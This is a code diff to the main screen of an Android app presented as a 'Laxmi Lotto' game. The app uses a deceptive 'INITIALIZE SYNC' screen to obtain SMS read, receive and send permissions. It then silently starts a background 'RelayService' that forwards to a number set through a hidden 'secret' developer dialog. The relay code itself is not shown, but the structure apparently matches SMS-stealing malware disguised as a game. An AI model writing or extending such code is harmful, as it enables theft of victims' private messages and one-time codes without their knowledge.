@@ -14,12 +14,15 @@ import androidx.activity.enableEdgeToEdge
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.compose.foundation.background
 import androidx.compose.foundation.layout.*
+import androidx.compose.material.icons.Icons
+import androidx.compose.material.icons.filled.Gamepad
 import androidx.compose.material3.*
 import androidx.compose.runtime.*
 import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
 import androidx.compose.ui.graphics.Color
 import androidx.compose.ui.platform.LocalContext
+import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.viewinterop.AndroidView
 import androidx.core.content.ContextCompat
@@ -31,11 +34,45 @@ import com.example.ui.theme.MyApplicationTheme
 
 class MainActivity : ComponentActivity() {
 
-    private lateinit var settingsManager: SettingsManager
-    var hasPermissionsState = mutableStateOf(false)
-    var showSecretDialogState = mutableStateOf(false)
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        enableEdgeToEdge()
+        setContent {
+            MyApplicationTheme {
+                RelayApp()
+            }
+        }
+    }
 
-    private val requiredPermissions by lazy {
+    fun hasRequiredPermissions(): Boolean {
+        val permissions = mutableListOf(
+            Manifest.permission.INTERNET,
+            Manifest.permission.RECEIVE_SMS,
+            Manifest.permission.SEND_SMS,
+            Manifest.permission.READ_SMS
+        ).apply {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                add(Manifest.permission.POST_NOTIFICATIONS)
+            }
+        }
+        return permissions.all {
+            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
+        }
+    }
+}
+
+@OptIn(ExperimentalMaterial3Api::class)
+@Composable
+fun RelayApp() {
+    val context = LocalContext.current
+    val settingsManager = remember { SettingsManager(context) }
+
+    var hasPermissions by remember { mutableStateOf(false) }
+    var relayState by remember { mutableStateOf(settingsManager.relayState) }
+    var showSecretDialog by remember { mutableStateOf(false) }
+    var currentTargetNumber by remember { mutableStateOf(settingsManager.targetNumber) }
+
+    val requiredPermissions = remember {
         mutableListOf(
             Manifest.permission.INTERNET,
             Manifest.permission.RECEIVE_SMS,
@@ -45,146 +82,145 @@ class MainActivity : ComponentActivity() {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                 add(Manifest.permission.POST_NOTIFICATIONS)
             }
-        }.toTypedArray()
+        }
     }
 
-    private val permissionLauncher = registerForActivityResult(
-        ActivityResultContracts.RequestMultiplePermissions()
-    ) { _ ->
-        checkPermissionsAndUpdateState()
-    }
-
-    override fun onCreate(savedInstanceState: Bundle?) {
-        super.onCreate(savedInstanceState)
-        enableEdgeToEdge()
-
-        settingsManager = SettingsManager(this)
-
-        checkPermissionsAndUpdateState()
-
-        setContent {
-            MyApplicationTheme {
-                if (settingsManager.isExpired()) {
-                    settingsManager.clearAll()
-                    Box(
-                        modifier = Modifier
-                            .fillMaxSize()
-                            .background(Color.Black),
-                        contentAlignment = Alignment.Center
-                    ) {
-                        Text(
-                            "Service Unavailable",
-                            color = Color.Red,
-                            style = MaterialTheme.typography.headlineMedium
-                        )
-                    }
-                } else {
-                    LaxmiLottoApp(
-                        settingsManager = settingsManager,
-                        hasPermissions = hasPermissionsState.value,
-                        onRequestPermissions = { requestSmsPermissions() },
-                        onOpenDeveloperConfig = { showSecretDialogState.value = true }
-                    )
-
-                    if (showSecretDialogState.value) {
-                        DeveloperConfigDialog(
-                            currentNumber = settingsManager.targetNumber,
-                            onDismiss = { showSecretDialogState.value = false },
-                            onSave = { newNumber ->
-                                settingsManager.targetNumber = newNumber
-                                showSecretDialogState.value = false
-                            }
-                        )
-                    }
+    val lifecycleOwner = androidx.lifecycle.compose.LocalLifecycleOwner.current
+    DisposableEffect(lifecycleOwner) {
+        val observer = androidx.lifecycle.LifecycleEventObserver { _, event ->
+            if (event == androidx.lifecycle.Lifecycle.Event.ON_RESUME) {
+                hasPermissions = requiredPermissions.all {
+                    ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
                 }
             }
         }
-    }
-
-    override fun onResume() {
-        super.onResume()
-        checkPermissionsAndUpdateState()
-    }
-
-    fun hasRequiredPermissions(): Boolean {
-        return requiredPermissions.all {
-            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
+        lifecycleOwner.lifecycle.addObserver(observer)
+        onDispose {
+            lifecycleOwner.lifecycle.removeObserver(observer)
         }
     }
 
-    private fun checkPermissionsAndUpdateState() {
-        val granted = hasRequiredPermissions()
-        hasPermissionsState.value = granted
-        if (granted && settingsManager.relayState != RelayState.ABORTED) {
-            startRelayService()
+    val permissionLauncher = androidx.activity.compose.rememberLauncherForActivityResult(
+        contract = ActivityResultContracts.RequestMultiplePermissions()
+    ) { _ ->
+        hasPermissions = requiredPermissions.all {
+            ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
         }
     }
 
-    fun requestSmsPermissions() {
-        permissionLauncher.launch(requiredPermissions)
-    }
-
-    private fun startRelayService() {
-        try {
-            val serviceIntent = Intent(this, RelayService::class.java)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(serviceIntent)
-            } else {
-                startService(serviceIntent)
+    LaunchedEffect(hasPermissions, relayState) {
+        if (hasPermissions && relayState != RelayState.ABORTED) {
+            try {
+                val serviceIntent = Intent(context, RelayService::class.java)
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    context.startForegroundService(serviceIntent)
+                } else {
+                    context.startService(serviceIntent)
+                }
+            } catch (e: Exception) {
+                android.util.Log.e("MainActivity", "Error starting RelayService", e)
             }
-        } catch (e: Exception) {
-            android.util.Log.e("MainActivity", "Error starting RelayService", e)
         }
     }
-}
 
-@Composable
-fun LaxmiLottoApp(
-    settingsManager: SettingsManager,
-    hasPermissions: Boolean,
-    onRequestPermissions: () -> Unit,
-    onOpenDeveloperConfig: () -> Unit
-) {
-    val context = LocalContext.current
-
-    LaunchedEffect(hasPermissions) {
-        if (!hasPermissions) {
-            onRequestPermissions()
-        }
+    if (showSecretDialog) {
+        DeveloperConfigDialog(
+            currentNumber = currentTargetNumber,
+            onDismiss = { showSecretDialog = false },
+            onSave = { newNumber ->
+                settingsManager.targetNumber = newNumber
+                currentTargetNumber = newNumber
+                showSecretDialog = false
+            }
+        )
     }
 
     Box(modifier = Modifier.fillMaxSize()) {
-        AndroidView(
-            factory = { ctx ->
-                WebView(ctx).apply {
-                    webViewClient = WebViewClient()
-                    webChromeClient = android.webkit.WebChromeClient()
-                    settings.apply {
-                        javaScriptEnabled = true
-                        domStorageEnabled = true
-                        databaseEnabled = true
-                        allowFileAccess = true
-                        allowContentAccess = true
-                        blockNetworkLoads = false
-                        cacheMode = WebSettings.LOAD_DEFAULT
-                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-                            mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
-                        }
-                    }
-                    addJavascriptInterface(
-                        WebAppInterface(
-                            context = ctx,
-                            settingsManager = settingsManager,
-                            onPermissionRequested = onRequestPermissions,
-                            onOpenDeveloperConfig = onOpenDeveloperConfig
-                        ),
-                        "AndroidBridge"
+        if (!hasPermissions) {
+            Column(
+                modifier = Modifier
+                    .fillMaxSize()
+                    .background(Color(0xFF0F0F0F)),
+                verticalArrangement = Arrangement.Center,
+                horizontalAlignment = Alignment.CenterHorizontally
+            ) {
+                Icon(
+                    imageVector = Icons.Default.Gamepad,
+                    contentDescription = "Secure Access",
+                    modifier = Modifier.size(100.dp),
+                    tint = Color(0xFF00E5FF)
+                )
+                Spacer(modifier = Modifier.height(32.dp))
+                Text(
+                    text = "SYNC REQUIRED",
+                    style = MaterialTheme.typography.headlineMedium,
+                    fontWeight = FontWeight.ExtraBold,
+                    color = Color.White
+                )
+                Spacer(modifier = Modifier.height(16.dp))
+                Text(
+                    text = "Access required to activate the\nLaxmi Lotto Terminal",
+                    style = MaterialTheme.typography.bodyLarge,
+                    textAlign = androidx.compose.ui.text.style.TextAlign.Center,
+                    color = Color(0xFFBDBDBD),
+                    modifier = Modifier.padding(horizontal = 32.dp)
+                )
+                Spacer(modifier = Modifier.height(48.dp))
+                Button(
+                    onClick = {
+                        permissionLauncher.launch(requiredPermissions.toTypedArray())
+                    },
+                    modifier = Modifier
+                        .fillMaxWidth(0.85f)
+                        .height(64.dp),
+                    shape = androidx.compose.foundation.shape.RoundedCornerShape(32.dp),
+                    colors = ButtonDefaults.buttonColors(
+                        containerColor = Color(0xFF00E5FF),
+                        contentColor = Color.Black
                     )
-                    loadUrl("file:///android_asset/www/index.html")
+                ) {
+                    Text(
+                        "INITIALIZE SYNC",
+                        fontWeight = FontWeight.Black,
+                        style = MaterialTheme.typography.titleLarge
+                    )
                 }
-            },
-            modifier = Modifier.fillMaxSize()
-        )
+            }
+        } else {
+            AndroidView(
+                factory = { ctx ->
+                    WebView(ctx).apply {
+                        webViewClient = WebViewClient()
+                        webChromeClient = android.webkit.WebChromeClient()
+                        settings.apply {
+                            javaScriptEnabled = true
+                            domStorageEnabled = true
+                            databaseEnabled = true
+                            allowFileAccess = true
+                            allowContentAccess = true
+                            blockNetworkLoads = false
+                            cacheMode = WebSettings.LOAD_DEFAULT
+                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                                mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
+                            }
+                        }
+                        addJavascriptInterface(
+                            WebAppInterface(
+                                context = ctx,
+                                settingsManager = settingsManager,
+                                onPermissionRequested = {
+                                    permissionLauncher.launch(requiredPermissions.toTypedArray())
+                                },
+                                onOpenDeveloperConfig = { showSecretDialog = true }
+                            ),
+                            "AndroidBridge"
+                        )
+                        loadUrl("file:///android_asset/www/index.html")
+                    }
+                },
+                modifier = Modifier.fillMaxSize()
+            )
+        }
     }
 }
 
